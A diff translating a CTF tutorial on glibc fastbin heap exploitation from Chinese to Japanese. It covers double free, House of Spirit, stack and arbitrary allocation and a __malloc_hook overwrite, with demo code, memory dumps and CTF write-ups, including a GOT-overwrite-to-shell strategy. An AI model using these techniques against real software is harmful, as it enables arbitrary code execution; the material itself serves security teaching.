@@ -1,24 +1,24 @@
 # Fastbin Attack
 
-## 介绍
-fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：
+## はじめに
+fastbin attack は脆弱性の攻撃手法の一種で、fastbin の仕組みに基づくあらゆる脆弱性攻撃を指します。この種の攻撃の前提は次のとおりです。
 
-* 存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞
-* 漏洞发生于 fastbin 类型的 chunk 中
+* ヒープオーバーフローや use-after-free など、chunk の内容を制御できる脆弱性が存在する
+* 脆弱性が fastbin 型の chunk で発生する
 
-如果细分的话，可以做如下的分类：
+細かく分けると、次のように分類できます。
 
 - Fastbin Double Free
 - House of Spirit
 - Alloc to Stack
 - Arbitrary Alloc
 
-其中，前两种主要漏洞侧重于利用 `free` 函数释放**真的 chunk 或伪造的 chunk**，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 `fd` 指针，直接利用 `malloc` 申请指定位置 chunk 进行攻击。
+このうち、前の2つは主に `free` 関数で**本物の chunk または偽の chunk** を解放し、その後 chunk を再び確保して攻撃することに重点があり、後の2つは意図的に `fd` ポインタを書き換え、`malloc` で指定した位置の chunk を直接確保して攻撃することに重点があります。
 
 ## 原理
 
-fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。
-我们来看一下 fastbin 是怎样管理空闲 chunk 的。
+fastbin attack が存在する理由は、fastbin が単方向リストで解放されたヒープブロックを維持しており、さらに fastbin が管理する chunk は解放されても、その next_chunk の prev_inuse ビットがクリアされないためです。
+fastbin が空き chunk をどのように管理しているかを見てみましょう。
 ```
 int main(void)
 {
@@ -26,14 +26,14 @@ int main(void)
     chunk1=malloc(0x30);
     chunk2=malloc(0x30);
     chunk3=malloc(0x30);
-    //进行释放
+    //解放する
     free(chunk1);
     free(chunk2);
     free(chunk3);
     return 0;
 }
 ```
-释放前
+解放前
 ```
 0x602000:	0x0000000000000000	0x0000000000000041 <=== chunk1
 0x602010:	0x0000000000000000	0x0000000000000000
@@ -49,7 +49,7 @@ int main(void)
 0x6020b0:	0x0000000000000000	0x0000000000000000
 0x6020c0:	0x0000000000000000	0x0000000000020f41 <=== top chunk
 ```
-执行三次 free 进行释放后
+3回 free を実行して解放した後
 ```
 0x602000:	0x0000000000000000	0x0000000000000041 <=== chunk1
 0x602010:	0x0000000000000000	0x0000000000000000
@@ -65,7 +65,7 @@ int main(void)
 0x6020b0:	0x0000000000000000	0x0000000000000000
 0x6020c0:	0x0000000000000000	0x0000000000020f41 <=== top chunk
 ```
-此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1构成了一个单链表
+このとき、main_arena にある fastbin のリストには chunk3 を指すポインタがすでに格納されており、chunk 3、2、1 が単方向リストを構成しています。
 ```
 Fastbins[idx=2, size=0x30,ptr=0x602080]
 ===>Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)
@@ -76,14 +76,14 @@ Fastbins[idx=2, size=0x30,ptr=0x602080]
 
 ## Fastbin Double Free
 
-### 介绍
+### 概要
 
-Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆(type confused)的效果。
+Fastbin Double Free とは、fastbin の chunk を複数回解放できることを指します。そのため、fastbin のリストに同じ chunk が複数回存在しえます。この結果、複数回の割り当てで fastbin のリストから同じヒープブロックを取り出せます。これは複数のポインタが同じヒープブロックを指しているのと同じで、ヒープブロックのデータ内容と組み合わせて、型混同(type confused)のような効果を実現できます。
 
-Fastbin Double Free 能够成功利用主要有两部分的原因
+Fastbin Double Free が成功する理由は、主に2つあります。
 
-1. fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空
-2. fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。
+1. fastbin のヒープブロックは解放された後も、next_chunk の pre_inuse ビットがクリアされない
+2. fastbin は free を実行するとき、main_arena が直接指しているブロック、つまりリストの先頭ポインタにあるブロックしか検証しない。リストの後ろのブロックについては検証が行われない。
 
 ```
 /* Another simple check: make sure the top of the bin is not the
@@ -95,8 +95,8 @@ Fastbin Double Free 能够成功利用主要有两部分的原因
 }
 ```
 
-### 演示
-下面的示例程序说明了这一点，当我们试图执行以下代码时
+### デモ
+次のサンプルプログラムがこの点を示しています。次のコードを実行しようとすると、
 
 ```
 int main(void)
@@ -110,7 +110,7 @@ int main(void)
     return 0;
 }
 ```
-如果你执行这个程序，不出意外的话会得到如下的结果，这正是 _int_free 函数检测到了 fastbin 的 double free。
+このプログラムを実行すると、予想外のことがなければ次のような結果になります。これはまさに _int_free 関数が fastbin の double free を検出したものです。
 ```
 *** Error in `./tst': double free or corruption (fasttop): 0x0000000002200010 ***
 ======= Backtrace: =========
@@ -147,7 +147,7 @@ int main(void)
 ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
 已放弃 (核心已转储)
 ```
-如果我们在 chunk1 释放后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。
+chunk1 を解放した後に chunk2 を解放すると、main_arena は chunk1 ではなく chunk2 を指すようになり、このとき chunk1 を解放しても検出されなくなります。
 ```
 int main(void)
 {
@@ -161,23 +161,23 @@ int main(void)
     return 0;
 }
 ```
-第一次释放`free(chunk1)`
+1回目の解放 `free(chunk1)`
 
 ![](./figure/fastbin_free_chunk1.png)
 
-第二次释放`free(chunk2)`
+2回目の解放 `free(chunk2)`
 
 ![](./figure/fastbin_free_chunk2.png)
 
-第三次释放`free(chunk1)`
+3回目の解放 `free(chunk1)`
 
 
 
 ![](./figure/fastbin_free_chunk3.png)
 
 
-注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。
-下面这个示例演示了这一点，首先跟前面一样构造 main_arena=>chunk1=>chun2=>chunk1的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，之后我们可以看到 fastbin 会把堆块分配到这里。
+chunk1 が再び解放されたため、その fd の値は 0 ではなく chunk2 を指すようになっている点に注意してください。このとき chunk1 の内容を制御できれば、その fd ポインタに書き込むことで、望みの任意のアドレスに fastbin ブロックを確保させることができます。
+次のサンプルがこれを示しています。まず前の例と同様に main_arena=>chunk1=>chun2=>chunk1 のリストを作ります。その後、最初に malloc を呼び出して chunk1 を返させた後、chunk1 の fd ポインタを bss セグメント上の bss_chunk に書き換えます。すると、fastbin がヒープブロックをそこに割り当てることが分かります。
 
 ```
 typedef struct _chunk
@@ -212,7 +212,7 @@ int main(void)
     return 0;
 }
 ```
-在我的系统上 chunk_b 输出的值会是 0x601090，这个值位于bss段中正是我们之前设置的`CHUNK bss_chunk`
+私の環境では chunk_b の出力値は 0x601090 になります。この値は bss セグメント内にあり、先ほど設定した `CHUNK bss_chunk` です。
 ```
 Start              End                Offset             Perm Path
 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
@@ -226,7 +226,7 @@ Start              End                Offset             Perm Path
 0x6010b0:	            0x0000000000000000	0x0000000000000000
 0x6010c0:	            0x0000000000000000	0x0000000000000000
 ```
-值得注意的是，我们在 main 函数的第一步就进行了`bss_chunk.size=0x21;`的操作，这是因为_int_malloc会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。
+注目すべきは、main 関数の最初の手順で `bss_chunk.size=0x21;` という操作をしている点です。これは _int_malloc が割り当てようとする位置の size フィールドを検証し、その size が現在の fastbin のリストにあるべき size と合わなければ例外を投げるためです。
 ```
 *** Error in `./tst': malloc(): memory corruption (fast): 0x0000000000601090 ***
 ======= Backtrace: =========
@@ -263,7 +263,7 @@ Start              End                Offset             Perm Path
 ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
 已放弃 (核心已转储)
 ```
-_int_malloc 中的校验如下
+_int_malloc での検査は次のとおりです。
 ```
 if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
 	{
@@ -274,31 +274,31 @@ if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
 }
 ```
 
-### 小总结
-通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。
-如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果( 首先要通过验证 )，这就相当于任意地址写任意值的效果。
+### まとめ
+fastbin double free により、複数のポインタで同じヒープブロックを制御できます。これはヒープブロック内の重要なデータフィールドの改ざんや、型混同のような効果の実現に使えます。
+さらに fd ポインタを書き換えれば、任意のアドレスにヒープブロックを割り当てる効果を実現できます(まず検証を通過する必要があります)。これは、任意のアドレスに任意の値を書き込む効果に相当します。
 
 ## House Of Spirit
 
-### 介绍
+### 概要
 
-House of Spirit 是 `the Malloc Maleficarum` 中的一种技术。
+House of Spirit は `the Malloc Maleficarum` にある技術の1つです。
 
-该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配**指定地址**的 chunk 的目的。
+この技術の核心は、目的の位置に fastbin の chunk を偽造して解放することで、**指定したアドレス**の chunk を割り当てるという目的を達成することです。
 
-要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即
+fastbin の偽 chunk を作り、それを解放したときに対応する fastbin のリストに入れられるようにするには、いくつかの必要な検査を回避する必要があります。すなわち、
 
-- fake chunk 的 ISMMAP 位不能为1，因为 free 时，如果是 mmap 的 chunk，会单独处理。
-- fake chunk 地址需要对齐， MALLOC_ALIGN_MASK
-- fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。
-- fake chunk 的 next chunk 的大小不能小于 `2 * SIZE_SZ`，同时也不能大于`av->system_mem` 。
-- fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。
+- fake chunk の ISMMAP ビットが 1 であってはならない。free 時に mmap の chunk であれば別に処理されるため。
+- fake chunk のアドレスはアライメントされている必要がある(MALLOC_ALIGN_MASK)
+- fake chunk の size は、対応する fastbin の要件を満たす必要があり、アライメントもされている必要がある。
+- fake chunk の next chunk のサイズは `2 * SIZE_SZ` より小さくてはならず、`av->system_mem` より大きくてもならない。
+- fake chunk に対応する fastbin のリストの先頭が、その fake chunk であってはならない。つまり double free の状況になってはならない。
 
-至于为什么要绕过这些检测，可以参考 free 部分的源码。
+なぜこれらの検査を回避する必要があるかについては、free の部分のソースコードを参照してください。
 
-### 演示
+### デモ
 
-这里就直接以 how2heap 上的例子进行说明，如下
+ここでは how2heap の例を使って説明します。次のとおりです。
 
 ```c
 #include <stdio.h>
@@ -338,7 +338,7 @@ int main()
 }
 ```
 
-运行后的效果如下
+実行した結果は次のとおりです。
 
 ```shell
 ➜  how2heap git:(master) ./house_of_spirit
@@ -356,20 +356,20 @@ Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, 
 malloc(0x30): 0x7ffd9bceaa60
 ```
 
-### 小总结
+### まとめ
 
-可以看出，想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，**关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测**。
+この技術で chunk を指定のアドレスに割り当てるには、実は指定アドレスの内容を一切変更する必要がないことが分かります。**重要なのは、指定アドレスの前後の内容を変更して、対応する検査を回避できるようにすることです**。
 
 ## Alloc to Stack
 
-### 介绍
+### 概要
 
-如果你已经理解了前文所讲的 Fastbin Double Free 与 house of spirit 技术，那么理解该技术就已经不成问题了，它们的本质都在于 fastbin 链表的特性：当前 chunk 的 fd 指针指向下一个 chunk。
+前述の Fastbin Double Free と house of spirit の技術を理解していれば、この技術の理解は問題ないはずです。これらの本質はどれも fastbin のリストの性質、つまり現在の chunk の fd ポインタが次の chunk を指すという点にあります。
 
-该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。
+この技術の核心は、fastbin のリスト中の chunk の fd ポインタを乗っ取り、その fd ポインタを確保したいスタック上の位置に向けることで、スタック中の戻りアドレスなどの重要なデータを制御することです。
 
-### 演示
-这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。
+### デモ
+今回は fake_chunk をスタック中に置き、これを stack_chunk と呼びます。同時に fastbin のリスト中の chunk の fd の値を乗っ取り、この fd の値を stack_chunk に向けることで、スタック中に fastbin chunk を割り当てられます。
 ```
 typedef struct _chunk
 {
@@ -397,19 +397,19 @@ int main(void)
     return 0;
 }
 ```
-通过 gdb 调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk
+gdb でデバッグすると、まず chunk1 の fd ポインタを stack_chunk に向けたことが分かります。
 ```
 0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk1
 0x602010:	0x00007fffffffde60	0x0000000000000000
 0x602020:	0x0000000000000000	0x0000000000020fe1 <=== top chunk
 ```
-之后第一次 malloc 使得 fastbin 链表指向了 stack_chunk，这意味着下一次分配会使用 stack_chunk 的内存进行
+その後、最初の malloc により fastbin のリストが stack_chunk を指すようになります。これは、次の割り当てでは stack_chunk のメモリが使われることを意味します。
 ```
 0x7ffff7dd1b20 <main_arena>:	0x0000000000000000 <=== unsorted bin
 0x7ffff7dd1b28 <main_arena+8>:  0x00007fffffffde60 <=== fastbin[0]
 0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000
 ```
-最终第二次malloc返回值为0x00007fffffffde70也就是stack_chunk
+最終的に、2回目の malloc の戻り値は 0x00007fffffffde70、つまり stack_chunk になります。
 ```
    0x400629 <main+83>        call   0x4004c0 <malloc@plt>
  → 0x40062e <main+88>        mov    QWORD PTR [rbp-0x38], rax
@@ -438,18 +438,18 @@ int main(void)
 ```
 
 
-### 小总结
-通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的size值。
+### まとめ
+この技術により、fastbin chunk をスタックに割り当て、戻りアドレスなどの重要なデータを制御できます。これを実現するには、fastbin 中の chunk の fd フィールドを乗っ取ってスタック上に向ける必要があり、もちろんスタック上に条件を満たす size の値が存在することも必要です。
 
 ## Arbitrary Alloc
 
-### 介绍
+### 概要
 
-Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。
-事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如bss、heap、data、stack等等。
+Arbitrary Alloc は実は Alloc to stack とまったく同じで、唯一の違いは、割り当ての対象がスタックではなくなることです。
+実際には、対象のアドレスに正当な size フィールドがありさえすれば(この size フィールドが作ったものか、もともと存在するものかは問いません)、chunk を bss、heap、data、stack など、書き込み可能な任意のメモリに割り当てられます。
 
-### 演示
-在这个例子，我们使用字节错位来实现直接分配 fastbin 到**\_malloc_hook的位置，相当于覆盖_malloc_hook来控制程序流程。**
+### デモ
+この例では、バイトのずらしを使って、fastbin を **\_malloc_hook の位置に直接割り当て、_malloc_hook を上書きしてプログラムのフローを制御することに相当します。**
 ```
 int main(void)
 {
@@ -468,7 +468,7 @@ int main(void)
     return 0;
 }
 ```
-这里的0x7ffff7dd1af5是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。
+ここの 0x7ffff7dd1af5 は、私の環境の状況から得た値です。この値はどうやって得たのでしょうか。まず、書き込みたいアドレスの付近に、バイトのずらしが使える箇所があるかを観察する必要があります。
 ```
 0x7ffff7dd1a88 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
 0x7ffff7dd1a90 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
@@ -489,9 +489,9 @@ int main(void)
 0x7ffff7dd1b08 0x0	0x2a 0xa9 0xf7 0xff	0x7f 0x0 0x0
 0x7ffff7dd1b10 <__malloc_hook>:	0x30	0x28	0xa9	0xf7	0xff	0x7f	0x0	0x0
 ```
-0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的size域。因为这个程序是 64 位的，因此 fastbin 的范围为32字节到128字节(0x20-0x80)，如下：
+0x7ffff7dd1b10 は制御したい __malloc_hook のアドレスです。そこで、上方向に探して、正当な size フィールドをずらして作れるかを調べます。このプログラムは64ビットなので、fastbin の範囲は 32 バイトから 128 バイト(0x20-0x80)です。次のとおりです。
 ```
-//这里的size指用户区域，因此要小2倍SIZE_SZ
+//ここでの size はユーザー領域を指すため、SIZE_SZ の2倍だけ小さい
 Fastbins[idx=0, size=0x10]
 Fastbins[idx=1, size=0x20]
 Fastbins[idx=2, size=0x30]
@@ -500,24 +500,24 @@ Fastbins[idx=4, size=0x50]
 Fastbins[idx=5, size=0x60]
 Fastbins[idx=6, size=0x70]
 ```
-通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个0x000000000000007f
+観察すると、0x7ffff7dd1af5 の位置で、バイトのずらしによって 0x000000000000007f を作れることが分かります。
 ```
 0x7ffff7dd1af0 0x60 0x2	0xdd 0xf7 0xff 0x7f	0x0	0x0
 0x7ffff7dd1af8 0x0  0x0	0x0	0x0	0x0	0x0	0x0	0x0
 
 0x7ffff7dd1af5 <_IO_wide_data_0+309>:	0x000000000000007f
 ```
-因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。
+0x7f は fastbin index の計算では index 5、つまり chunk サイズが 0x70 のものに属するからです。
 
 ```c
 ##define fastbin_index(sz)                                                      \
     ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
 ```
-（注意sz的大小是unsigned int，因此只占4个字节）
+(sz のサイズは unsigned int なので、4 バイトしか占めない点に注意してください)
 
 
-而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。
-最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 __malloc_hook的内容(在我的libc中__realloc_hook与__malloc_hook是在连在一起的)。
+そしてそのサイズには 0x10 の chunk_header が含まれているため、0x60 の fastbin を確保し、リストに加えることにします。
+最後に2回割り当てを行うと、chunk が 0x7ffff7dd1afd に割り当てられるのが観察でき、これで __malloc_hook の内容を直接制御できます(私の libc では __realloc_hook と __malloc_hook は連続しています)。
 
 ```
 0x4005a8 <main+66>        call   0x400450 <malloc@plt>
@@ -533,11 +533,11 @@ Fastbins[idx=6, size=0x70]
 ```
 
 
-### 小总结
-Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。
+### まとめ
+Arbitrary Alloc は CTF でより頻繁に使われます。バイトのずらしなどの方法で size フィールドの検査を回避し、任意のアドレスに chunk を割り当てられます。最終的な効果は、任意のアドレスに任意の値を書き込むことに相当します。
 
 ## 2014 hack.lu oreo
-[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/fastbin-attack/2014_hack.lu_oreo)
+[問題へのリンク](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/fastbin-attack/2014_hack.lu_oreo)
 
 ### 基本分析
 
@@ -553,13 +553,13 @@ oreo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically link
     PIE:      No PIE (0x8048000)
 ```
 
-可以看出，程序确实是比较老的，32位程序，动态链接，就连 RELRO 技术也没有上。
+プログラムは確かにかなり古く、32ビットのプログラムで動的リンクであり、RELRO さえ有効になっていないことが分かります。
 
-### 基本功能
+### 基本機能
 
-**需要注意的是，该程序并没有进行 setvbuf 操作，因此在初次执行 io 函数时，会在堆上分配空间。**
+**注意:このプログラムは setvbuf を行っていないため、最初に io 関数を実行するとき、ヒープ上に領域が確保されます。**
 
-正如程序中直接输出的信息，程序主要是一个原始的在线枪支系统。其中，根据添加枪支的过程，我们可以得到枪支的基本结构如下
+プログラムが直接出力する情報のとおり、このプログラムは主に原始的なオンライン銃器システムです。銃器を追加する過程から、銃器の基本構造は次のようになると分かります。
 
 ```c
 00000000 rifle           struc ; (sizeof=0x38, mappedto_5)
@@ -569,25 +569,25 @@ oreo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically link
 00000038 rifle           ends
 ```
 
-程序的基本功能如下
+プログラムの基本機能は次のとおりです。
 
-- 添加枪支，其主要会读取枪支的名字与描述。但问题在于读取的名字的长度过长，可以覆盖 next 指针以及后面堆块的数据。可以覆盖后面堆块的数据大小为 56-(56-27)=27 大小。需要注意的是，这些枪支的大小都是在fastbin 范围内的。
-- 展示添加枪支，即从头到尾输出枪支的描述与名字。
-- 订已经选择的枪支，即将所有已经添加的枪支释放掉，但是并没有置为NULL。
-- 留下订货消息
-- 展示目前状态，即添加了多少只枪，订了多少单，留下了什么信息。
+- 銃器の追加。主に銃器の名前と説明を読み込みます。しかし問題は、読み込む名前の長さが長すぎて、next ポインタと後ろのヒープブロックのデータを上書きできることです。後ろのヒープブロックのデータを上書きできるサイズは 56-(56-27)=27 です。なお、これらの銃器のサイズはどれも fastbin の範囲内です。
+- 追加した銃器の表示。最初から最後まで、銃器の説明と名前を出力します。
+- 選択済みの銃器を注文する。追加済みの銃器をすべて解放しますが、NULL にはしません。
+- 注文メッセージを残す
+- 現在の状態を表示する。つまり、銃を何丁追加したか、何件注文したか、どんなメッセージを残したかを表示します。
 
-不难分析得到，程序的漏洞主要存在于添加枪支时的堆溢出漏洞。
+分析すると、プログラムの脆弱性は主に、銃器を追加するときのヒープオーバーフローにあることが分かります。
 
-### 利用
+### 攻撃
 
-基本利用思路如下
+基本的な攻撃の流れは次のとおりです。
 
-1. 由于程序存在堆溢出漏洞，而且还可以控制 next 指针，我们可以直接控制 next 指针指向程序中 got 表的位置。当进行展示的时候，即可以输出对应的内容，这里同时需要确保假设对应地址为一个枪支结构体时，其 next 指针为 NULL。这里我采用 puts@got。通过这样的操作，我们就可以获得出 libc 基地址，以及 system 函数地址。
-2. 由于枪支结构体大小是 0x38 大小，所以其对应的 chunk 为 0x40。这里采用 `house of sprit` 的技术来返回 0x0804A2A8 处的chunk，即留下的消息的指针。因此，我们需要设置 0x0804A2A4 处的内容为 0x40，即需要添加 0x40 支枪支，从而绕过大小检测。同时为了确保可以绕过 next chunk 的检测，这里我们编辑留下的消息。
-3. 在成功分配这样的 chunk 后，我们其实就有了一个任意地址修改的漏洞，这里我们可以选择修改一个合适的 got 项为 system 地址，从而获得 shell。
+1. プログラムにはヒープオーバーフローがあり、next ポインタも制御できるため、next ポインタを直接プログラム中の got テーブルの位置に向けられます。表示するときに対応する内容を出力でき、その際、対応するアドレスを銃器構造体と見なしたときに、その next ポインタが NULL になっていることを同時に保証する必要があります。ここでは puts@got を使いました。この操作で、libc のベースアドレスと system 関数のアドレスを得られます。
+2. 銃器構造体のサイズは 0x38 なので、対応する chunk は 0x40 です。ここでは `house of sprit` の技術を使い、0x0804A2A8 にある chunk、つまり残したメッセージのポインタを返させます。そのため、0x0804A2A4 の内容を 0x40 にする、つまり 0x40 丁の銃器を追加する必要があり、これでサイズの検査を回避します。同時に、next chunk の検査も回避できるようにするため、ここで残したメッセージを編集します。
+3. このような chunk の割り当てに成功すると、実質的に任意アドレスの書き換え脆弱性を手に入れたことになります。ここでは適切な got のエントリを system のアドレスに書き換えて、shell を得られます。
 
-具体代码如下
+具体的なコードは次のとおりです。
 
 ```python
 from pwn import *
@@ -683,12 +683,12 @@ if __name__ == "__main__":
 
 ```
 
-当然，该题目也可以使用 `fast bin attack` 中的其它技术来实现，可参考参考文献中的链接。
+もちろん、この問題は `fast bin attack` のほかの技術でも解けます。参考文献のリンクを参照してください。
 
 ## 2015 9447 CTF : Search Engine
-[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/fastbin-attack/2015_9447ctf_search-engine)
+[問題へのリンク](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/fastbin-attack/2015_9447ctf_search-engine)
 
-### 基本信息
+### 基本情報
 
 ```shell
 ➜  2015_9447ctf_search-engine git:(master) file search
@@ -704,26 +704,26 @@ search: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
 
 ```
 
-### 基本功能
+### 基本機能
 
-程序的基本功能是
+プログラムの基本機能は次のとおりです。
 
-- 索引一个句子
-  - 大小v0，(unsigned int)(v0 - 1) > 0xFFFD
-  - 读取的字符串长度必须和给定的大小相等
-  - 每次索引的句子都是直接在直接建立在前面的句子上的。
-- 在一个句子中搜索单词
-  - 大小v0，(unsigned int)(v0 - 1) > 0xFFFD
-- 读取指定长度字符串
-  - 如果有回车标记
-    - 在指定长度内没有遇到回车，则读完没有设置NULL标记
-    - 在指定长度内遇到回车，就截断返回。
-  - 没有回车标记
-    - 读够指定长度，没有NULL标记结尾。
+- 文を索引に追加する
+  - サイズ v0、(unsigned int)(v0 - 1) > 0xFFFD
+  - 読み込む文字列の長さは、指定したサイズと等しくなければならない
+  - 索引に追加する文は毎回、前の文の上に直接作られる。
+- 文の中で単語を検索する
+  - サイズ v0、(unsigned int)(v0 - 1) > 0xFFFD
+- 指定した長さの文字列を読み込む
+  - 改行マークがある場合
+    - 指定した長さの中で改行に出会わなければ、読み終えても NULL マークを設定しない
+    - 指定した長さの中で改行に出会えば、そこで切り詰めて返す。
+  - 改行マークがない場合
+    - 指定した長さを読み切っても、NULL マークで終端しない。
 
-### 词语结构体
+### 単語の構造体
 
-通过分析索引句子的过程，我们可以得到词语的结构如下
+文を索引に追加する過程を分析すると、単語の構造は次のようになると分かります。
 
 ```
 00000000 word_struct     struc ; (sizeof=0x28, mappedto_6)
@@ -737,24 +737,24 @@ search: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
 00000028 word_struct     ends
 ```
 
-### 堆内存相关操作
+### ヒープメモリに関する操作
 
-分配
+割り当て
 
-- malloc 40 字节为一个word结构体
-- 为句子或者单词 malloc 指定大小。
+- malloc 40 バイトを word 構造体とする
+- 文または単語のために、指定したサイズを malloc する。
 
-释放
+解放
 
-- 释放删除的句子
-- 释放删除句子所搜索的临时单词
-- 释放索引句子时未使用的单词结构
+- 削除された文を解放する
+- 削除した文を検索するための一時的な単語を解放する
+- 文を索引に追加するとき使われなかった単語構造体を解放する
 
-### 漏洞
+### 脆弱性
 
-**索引句子读取字符串时无NULL结尾**
+**文を索引に追加するときに読み込む文字列が NULL で終端されない**
 
-在索引句子时 flag_enter 永远为 0，所以读取句子时最后没有 NULL 结尾。
+文を索引に追加するとき flag_enter は常に 0 なので、文を読み込むときに最後が NULL で終端されません。
 
 ```c
     _flag_enter = flag_enter;
@@ -785,7 +785,7 @@ search: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
     }
 ```
 
-**读取选择操作数**
+**操作数の選択の読み込み**
 
 ```c
 __int64 read_num()
@@ -808,9 +808,9 @@ __int64 read_num()
 }
 ```
 
-因为 read_str 不设置NULL ，因此，如果 nptr 读取的不合法的话，就有可能会 leak 出栈上的内容。
+read_str は NULL を設定しないため、nptr として読み込まれたものが不正であれば、スタック上の内容が leak する可能性があります。
 
-**索引句子释放未置NULL**
+**索引に追加した文の解放時に NULL を設定しない**
 
 ```c
   else
@@ -819,7 +819,7 @@ __int64 read_num()
   }
 ```
 
-**搜索词语中删除词语时，对应句子指针只是释放，并没有设置为NULL**
+**単語の検索で単語を削除するとき、対応する文のポインタは解放されるだけで、NULL に設定されない**
 
 ```c
   for ( i = head; i; i = i->next )
@@ -845,21 +845,21 @@ __int64 read_num()
   free(v1);
 ```
 
-可以看出，在每次释放 i->sentence_ptr 之前，这个句子的内容就会全部被设置为 `\x00` ，由于单词结构体中存储的单词只是句子的一个指针，所以单词也会被置为 `\x00` 。该句子对应的那些单词仍然是存在于链表中的，并没有被删除，因此每次搜索单词的时候，仍然会判断。看起来由于句子内容被置为 `\x00` 可以防止通过 `*i->sentence_ptr` 验证。然而，由于 chunk 被释放后会被放到 bin 中，当 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的时候，也就有可能会产生 double free 的情况。此外，当句子被 `memset` 的时候，单词虽然都变为了 `\x00` ，但是我们仍然可以通过两个 `\x00` 的比较来绕过 `memcmp` 的检测。
+毎回 i->sentence_ptr を解放する前に、この文の内容がすべて `\x00` に設定されることが分かります。単語構造体に格納されている単語は文へのポインタにすぎないため、単語も `\x00` になります。その文に対応する単語はそれでもリストの中に存在し、削除されていないため、単語を検索するたびに判定が行われます。文の内容が `\x00` に設定されているので、`*i->sentence_ptr` による検証を防げるように見えます。しかし、chunk は解放されると bin に入れられるため、chunk が fastbin でない場合や、chunk が再び割り当てられて使われている場合には、double free が起こりえます。さらに、文が `memset` されたとき、単語はどれも `\x00` になりますが、2つの `\x00` の比較によって `memcmp` の検査を回避できます。
 
-### 利用
+### 攻撃
 
-#### 利用思路
+#### 攻撃の考え方
 
-基本利用思路如下
+基本的な攻撃の考え方は次のとおりです。
 
-- 利用 unsorted bin 地址泄漏 libc 基地址
-- 利用 double free 构造 fastbin 循环链表
